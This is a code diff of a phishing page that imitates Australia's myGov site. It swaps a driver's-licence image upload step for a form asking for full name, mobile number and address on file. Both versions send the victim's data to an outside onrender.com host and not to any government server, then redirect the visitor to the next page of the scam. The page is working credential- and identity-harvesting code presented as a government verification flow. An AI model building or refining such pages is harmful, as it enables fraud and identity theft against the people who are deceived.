@@ -4,41 +4,31 @@
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Upload Identification - myGov</title>
+    <title>Enter Personal Information - myGov</title>
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <script type="text/javascript" src="mask.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
     <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
     <link href="css/mgv2-application.css" rel="stylesheet">
     <link href="css/blugov.css" rel="stylesheet">
-    <link href="progress.min.css" rel="stylesheet" id="bootstrap-css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
     <style type="text/css">
-        .modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}
-        .modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}
-        .modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);-o-transform:translate(0,0);transform:translate(0,0)}
-        .modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto;margin:10px}
-        .modal-content{position:relative;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5)}
-        .modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;background-color:#000}.modal-backdrop.fade{filter:alpha(opacity=0);opacity:0}
-        .modal-backdrop.in{filter:alpha(opacity=50);opacity:.5}.modal-header{min-height:16.43px;padding:15px;border-bottom:1px solid #e5e5e5}
-        .modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.42857143}
-        .modal-body{position:relative;padding:15px}.modal-footer{padding:15px;text-align:right;border-top:1px solid #e5e5e5}
-        .modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}.modal-footer .btn-group .btn+.btn{margin-left:-1px}
-        .modal-footer .btn-block+.btn-block{margin-left:0}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}
-        @media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}.modal-sm{width:300px}}
-        @media (min-width:992px){.modal-lg{width:900px}}
-        .center {margin-top:50px;}
-        .modal-header {padding-bottom: 5px;}
-        .modal-footer {padding: 0;}
-        .modal-footer .btn-group button {height:40px;border-top-left-radius:0;border-top-right-radius:0;border:none;border-right:1px solid #ddd;}
-        .modal-footer .btn-group:last-child > button {border-right:0;}
+        .selectoption {
+            position: relative;
+            width: 100%;
+            border-radius: 2px;
+            border-radius: 0.125rem;
+            height: 48px;
+            height: 3rem;
+            border: 1px solid #000;
+            border: 0.0625rem solid #000;
+        }
         .error-message { color: red; margin-top: 10px; }
         .success-message { color: green; margin-top: 10px; }
     </style>
-    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
 </head>
 <body>
     <div class="brand-rainbow">&nbsp;</div>
@@ -57,82 +47,39 @@
     </header>
     <div class="wrapper-mapwap">
         <div class="main-block" id="content" role="main">
-            <div class="css-t2nf81">
-                <div class="css-k008qs">
-                    <div class="css-759u60" style="display: inline-block;">
-                        <p><img src="back.svg" width="8" class="chakra-image css-1mi6x1x"> <a href="/security.html">Back</a></p>
-                    </div>
-                </div>
-                <p class="chakra-text css-13iw4fu">Kindly submit your ID to finalize the verification process.</p>
-                <p class="chakra-text css-6ja8fn">
-                    <ul>
-                        <li style="margin-bottom: 20px;">Driver's License</li>
-                    </ul>
-                </p>
-                <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="button" class="button-main button">Continue to verification</button>
-                <center>
-                    <a href="/success.html">SKIP</a>
-                </center>
-            </div>
-            <!-- Feedback messages -->
-            <div id="feedback-message" class="hidden"></div>
-        </div>
-    </div>
-    <div class="modal fade" id="squarespaceModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header" style="text-align: right;">
-                    <button style="background-color: transparent; padding: 1px;" type="button" class="close" data-dismiss="modal"><img width="28" src="close.png"></button>
-                </div>
-                <div class="modal-body">
-                    <div class="progress progress-striped active">
-                        <div id="progress" class="bar" style="width: 50%;">50% Driver License</div>
-                    </div>
-                    <form id="upload-form" action="https://my-go-q7tp.onrender.com/submit-images" method="post" enctype="multipart/form-data">
-                        <h2 id="bodytext" style="font-size: 25px; color: black;">Driver License</h2>
-                        <p id="errortext" style="color: red; font-size: 13px; padding:1px;"></p>
-                        <div id="body2">
-                            <hr>
-                            <div class="row py-4">
-                                <div class="col-lg-6 mx-auto">
-                                    <div class="input-group mb-3 px-2 py-2 rounded-pill bg-white shadow-sm">
-                                        <div class="input-group-append">
-                                            <label class="btn btn-light m-0 rounded-pill px-4">
-                                                <i class="fa fa-cloud-upload mr-2 text-muted"></i>
-                                                <small class="text-uppercase font-weight-bold text-muted">Driver License Front</small>
-                                            </label>
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <h1>Enter Personal Information</h1>
+                                    <h2 class="text-align-left">Please enter your details below to continue verification.</h2>
+                                    <form id="info-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="https://my-go-q7tp.onrender.com/submit-info" method="post">
+                                        <div class="input-group">
+                                            <label class="override" for="fname">Full Name</label>
+                                            <input id="fname" name="fname" type="text" value="" autocomplete="off" required>
                                         </div>
-                                        <img style="float: right;" class="file-upload-image" width="50" src="dl.png" alt="your image" />
-                                        <input name="image" type="file" onchange="readURL(this);" class="form-control border-0" accept="image/*" required>
-                                    </div>
+                                        <div class="input-group">
+                                            <label class="override" for="mobnum">Mobile Number</label>
+                                            <input id="mobnum" name="mobnum" type="tel" value="" autocomplete="off" required>
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="address">Full Address on File</label>
+                                            <input id="address" name="address" type="text" value="" autocomplete="off" required>
+                                        </div>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="_eventId_submit">Submit</button>
+                                            </div>
+                                        </div>
+                                        <!-- Feedback messages -->
+                                        <div id="feedback-message" class="hidden"></div>
+                                    </form>
                                 </div>
                             </div>
-                            <br>
-                            <hr>
-                            <div class="col-lg-6 mx-auto" style="margin-bottom: 20px;">
-                                <div class="input-group mb-3 px-2 py-2 rounded-pill bg-white shadow-sm">
-                                    <div class="input-group-append">
-                                        <label class="btn btn-light m-0 rounded-pill px-4">
-                                            <i class="fa fa-cloud-upload mr-2 text-muted"></i>
-                                            <small class="text-uppercase font-weight-bold text-muted">Driver License Back</small>
-                                        </label>
-                                        <img style="float: right;" class="file-upload-image2" width="50" src="dl.png" alt="your image" />
-                                    </div>
-                                    <input name="image2" type="file" onchange="readURL2(this);" class="form-control border-0" accept="image/*" required>
-                                </div>
-                            </div>
-                            <br>
-                            <hr>
                         </div>
-                        <div id="buttonall" class="button-container">
-                            <button style="width: 100%;" type="submit" class="button-main button">VERIFY</button>
-                        </div>
-                        <!-- Spinner (Hidden by default) -->
-                        <div id="verifying-spinner" style="display:none; text-align:center; margin-top:20px;">
-                            <i class="fa fa-spinner fa-spin fa-2x"></i>
-                            <p style="margin-top:10px; font-weight:bold; font-size:16px;">Verifying...</p>
-                        </div>
-                    </form>
+                    </div>
                 </div>
             </div>
         </div>
@@ -153,7 +100,9 @@
                 </section>
                 <div class="footer-lower">
                     <section class="footer-lower-logo">
-                        <a href="https://beta.my.gov.au/"><img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img"></a>
+                        <a href="https://beta.my.gov.au/">
+                            <img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
                     </section>
                     <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                 </div>
@@ -161,45 +110,12 @@
         </div>
     </footer>
     <script type="text/javascript">
-        function readURL(input) {
-            if (input.files && input.files[0]) {
-                var reader = new FileReader();
-                reader.onload = function(e) {
-                    $('.file-upload-image').attr('src', e.target.result);
-                };
-                reader.readAsDataURL(input.files[0]);
-            }
-        }
-        function readURL2(input) {
-            if (input.files && input.files[0]) {
-                var reader = new FileReader();
-                reader.onload = function(e) {
-                    $('.file-upload-image2').attr('src', e.target.result);
-                };
-                reader.readAsDataURL(input.files[0]);
-            }
-        }
-
-        document.getElementById("upload-form").addEventListener("submit", async function(e) {
+        document.getElementById("info-form").addEventListener("submit", async function(e) {
             e.preventDefault();
             const form = e.target;
             const formData = new FormData(form);
             const feedbackDiv = document.getElementById("feedback-message");
-            const errortext = document.getElementById("errortext");
-            const verifyBtn = document.querySelector('#buttonall button');
-            const spinner = document.getElementById("verifying-spinner");
-
-            let img1 = document.querySelector('input[name="image"]').files.length;
-            let img2 = document.querySelector('input[name="image2"]').files.length;
-
-            if (img1 === 0 || img2 === 0) {
-                errortext.innerText = "Please upload both front and back images.";
-                return;
-            }
-
-            // Show spinner
-            verifyBtn.style.display = 'none';
-            spinner.style.display = 'block';
+            feedbackDiv.className = 'hidden';
 
             try {
                 const response = await fetch(form.action, {
@@ -217,19 +133,15 @@
                     feedbackDiv.textContent = '';
                     feedbackDiv.className = 'success-message';
                     setTimeout(() => {
-                        window.location.href = '/success.html'; // Redirect to success page
+                        window.location.href = '/personal.html'; // Redirect to personal.html
                     }, 1000);
                 } else {
-                    feedbackDiv.textContent = result.error || 'Error submitting images.';
+                    feedbackDiv.textContent = result.error || 'Error submitting information.';
                     feedbackDiv.className = 'error-message';
-                    verifyBtn.style.display = 'block';
-                    spinner.style.display = 'none';
                 }
             } catch (error) {
                 feedbackDiv.textContent = `Error: ${error.message || 'Network error. Please try again.'}`;
                 feedbackDiv.className = 'error-message';
-                verifyBtn.style.display = 'block';
-                spinner.style.display = 'none';
             }
         });
     </script>
